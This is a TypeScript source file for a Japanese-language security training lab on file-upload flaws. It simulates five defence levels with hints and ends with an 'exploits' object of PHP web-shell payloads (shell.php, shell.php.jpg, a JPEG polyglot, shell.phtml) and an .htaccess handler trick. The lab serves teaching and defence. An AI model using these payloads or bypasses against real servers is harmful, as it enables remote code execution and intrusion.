import type { AttackResult, Lab, LabInput, Level, LevelSpec } from "./types";
import { traced } from "./trace";

function run(level: Level, input: LabInput): AttackResult {
  const filename = (input.filename ?? "").trim().toLowerCase();
  const contentType = (input.contentType ?? "").trim().toLowerCase();
  const content = input.content ?? "";
  const hasScript = /<\?php|system\s*\(|shell_exec/i.test(content);
  let executable = false;
  let reason = "";

  if (level === 1) {
    executable = filename.endsWith(".php") && hasScript;
    reason = "アップロードした名前のまま公開ディレクトリへ保存しました。";
  } else if (level === 2) {
    executable = filename.includes(".php.") && hasScript;
    reason = executable
      ? "末尾だけを検査し、Web サーバーは途中の .php をハンドラとして解釈しました。"
      : "末尾が .php のファイルは拒否されました。";
  } else if (level === 3) {
    executable = /\.(?:jpe?g|png)$/.test(filename) && content.startsWith("FFD8") && hasScript;
    reason = executable
      ? "拡張子と先頭マジックは画像ですが、後続のスクリプトを残したまま保存しました。"
      : "画像の拡張子とマジックバイトの両方は満たしていません。";
  } else if (level === 4) {
    const imageExt = /\.(?:jpe?g|png|gif)$/.test(filename);
    const looksImage = content.startsWith("FFD8") || content.startsWith("8950");
    const allowed = imageExt || filename.endsWith(".phtml") || filename === ".htaccess";
    if (!allowed) {
      reason = ".php は拒否されました。画像拡張子と一部のレガシー拡張子だけ許可しています。";
    } else if (imageExt && looksImage) {
      reason = "画像をデコードして再エンコードしたため、埋め込みスクリプトは消えました。";
    } else if (filename.endsWith(".phtml") && hasScript) {
      executable = true;
      reason = "許可リストから漏れた .phtml を PHP ハンドラが実行しました。";
    } else if (filename === ".htaccess" && /addhandler|sethandler|php/i.test(content)) {
      executable = true;
      reason = ".htaccess でハンドラを追加し、以降のアップロードが実行可能になりました。";
    } else {
      reason = "許可された拡張子ですが、実行される内容ではありません。";
    }
  } else {
    reason = "画像デコーダで再構成し、ランダム名で実行不能な別オリジンへ保存しました。";
  }

  return traced(
    {
      solved: executable,
      output: [
        `filename=${filename || "(空)"}`,
        `Content-Type: ${contentType || "(なし)"}`,
        executable
          ? `[201 CREATED] /uploads/${filename}\n[EXECUTED] uid=www-data`
          : `[400/201 SAFE] ${reason}`,
      ],
      note: executable ? "アップロードした内容がサーバー側コードとして実行されました。" : reason,
    },
    executable ? `store /uploads/${filename} → exec php` : `store rejected: ${reason}`,
    executable
      ? {
          recap: ["許可された名前で保存された", "Web サーバーがスクリプトとして実行した", "www-data で id が走った"],
        }
      : undefined,
  );
}

const levels: Record<Level, LevelSpec> = {
  1: {
    defense: "種類を検証せず、元のファイル名で Web 公開ディレクトリへ保存する。",
    hints: [
      "アップロード先がスクリプトを実行できる場所です。",
      "サーバーが PHP と判断する拡張子を使います。",
      "`shell.php` に PHP コードを入れてアップロードします。",
    ],
    solution: "filename を `shell.php`、内容を `<?php system('id'); ?>` にします。",
    code: `await upload.mv("/var/www/public/uploads/" + upload.name);
// 種類検証なし・実行可能な場所`,
  },
  2: {
    defense: "ファイル名の末尾が `.php` の場合だけ拒否する。",
    hints: [
      "単純な末尾比較は複数の拡張子をどう扱うでしょうか？",
      "Web サーバー設定によっては、途中の拡張子もハンドラ選択に使われます。",
      "`shell.php.jpg` を試します。",
    ],
    solution: "`shell.php.jpg` の二重拡張子で末尾検査を通過します。",
    code: `if (name.endsWith(".php")) deny();
saveToWebRoot(name); // Apache の設定は .php.jpg も PHP として処理`,
  },
  3: {
    defense: "画像拡張子の許可リストと、サーバー側のマジックバイト検査。元のファイル名で保存する。",
    hints: [
      "Content-Type はもう信用していません。ソースは先頭バイトと拡張子を見ています。",
      "先頭が JPEG でも、ファイルの後ろに別の内容を足せます。",
      "ファイル名を `photo.jpg`、内容の先頭を `FFD8` にして PHP を続けます。",
    ],
    solution: "`photo.jpg` で、JPEG マジック `FFD8` の後に PHP を埋め込んだポリグロットを送ります。",
    code: `assertAllowedExtension(name); // .jpg / .png
if (!bytes.startsWith(JPEG_MAGIC)) deny();
saveToWebRoot(name, bytes); // 再エンコードしていない`,
  },
  4: {
    defense: "画像はデコードして再エンコードする。拡張子許可リストにレガシーな `.phtml` が残っている。",
    hints: [
      "`.jpg` のポリグロットは再エンコードで消えます。`.php` も拒否されます。",
      "許可リストは『画像だけ』でしょうか。Web サーバーが PHP として扱う別名はありませんか？",
      "`shell.phtml` に PHP を入れるか、`.htaccess` でハンドラを足します。",
    ],
    solution:
      "`shell.phtml` に PHP を入れます。画像の再エンコードを避け、許可リストから漏れた拡張子が実行されます。",
    code: `const allowed = [".jpg", ".png", ".gif", ".phtml"]; // テンプレート用の名残
if (isImage(name)) bytes = reencode(bytes);
store(randomUUID() + extname(name), bytes);`,
  },
  5: {
    defense: "画像をデコードして安全な形式へ再エンコードし、実行不能な別オリジンへランダム名で保存する。",
    hints: [
      "拡張子やヘッダではなく、画像として完全に解析して新しいデータを生成します。",
      "保存先ではスクリプト実行を無効化し、元の名前も使わないため突破できません。",
    ],
    solution: "突破不可能です。サイズ制限付きで画像をデコード・再エンコードし、実行権限のない隔離ストレージから配信します。",
    code: `const image = await decoder.decode(bytes, limits);
const safeBytes = await encoder.encode(image, "webp");
await isolatedStore.put(randomUUID() + ".webp", safeBytes);`,
  },
};

export const uploadLab: Lab = {
  meta: {
    id: "upload",
    title: "ファイルアップロード — Web シェル配置",
    shortTitle: "Upload",
    category: "ファイル処理",
    objective: "画像アップロード機能を回避し、サーバーで実行可能な内容を保存する。",
    summary: "拡張子、マジックバイト、再エンコード後も残るレガシー拡張子（.phtml）を学ぶ。",
    standards: {
      owasp: {
        code: "A04:2021",
        name: "Insecure Design",
        url: "https://owasp.org/Top10/A04_2021-Insecure_Design/",
      },
      cwe: [{ id: 434, name: "Unrestricted Upload of File with Dangerous Type" }],
    },
    references: [
      { title: "OWASP File Upload Cheat Sheet", url: "https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html" },
      { title: "PortSwigger — File upload vulnerabilities", url: "https://portswigger.net/web-security/file-upload" },
    ],
  },
  fields: [
    { name: "filename", label: "ファイル名", default: "avatar.jpg", mono: true },
    { name: "contentType", label: "Content-Type", default: "image/jpeg", mono: true },
    { name: "content", label: "ファイル内容（学習用テキスト表現）", default: "FFD8 SAFE_IMAGE_DATA", multiline: true, mono: true },
  ],
  explanation: `ファイルアップロードでは、ファイル名・拡張子・Content-Type はすべて攻撃者が変更できます。末尾検査、マジックバイト、内容検査のあとに元の拡張子を付ける、といった対策はそれぞれ別の穴を残します。

業務上必要な形式だけを許可し、サイズや画像寸法を制限した上で信頼できるライブラリで完全にデコードし、新しい画像として再エンコードします。保存名はサーバーが生成し、Web サーバーの実行機能がない隔離ストレージ・別オリジンから安全な Content-Type と Content-Disposition で配信します。`,
  levels,
  run,
  exploits: {
    1: { filename: "shell.php", contentType: "application/x-httpd-php", content: "<?php system('id'); ?>" },
    2: { filename: "shell.php.jpg", contentType: "image/jpeg", content: "<?php system('id'); ?>" },
    3: { filename: "photo.jpg", contentType: "image/jpeg", content: "FFD8...<?php system('id'); ?>" },
    4: { filename: "shell.phtml", contentType: "application/x-httpd-php", content: "<?php system('id'); ?>" },
  },
};
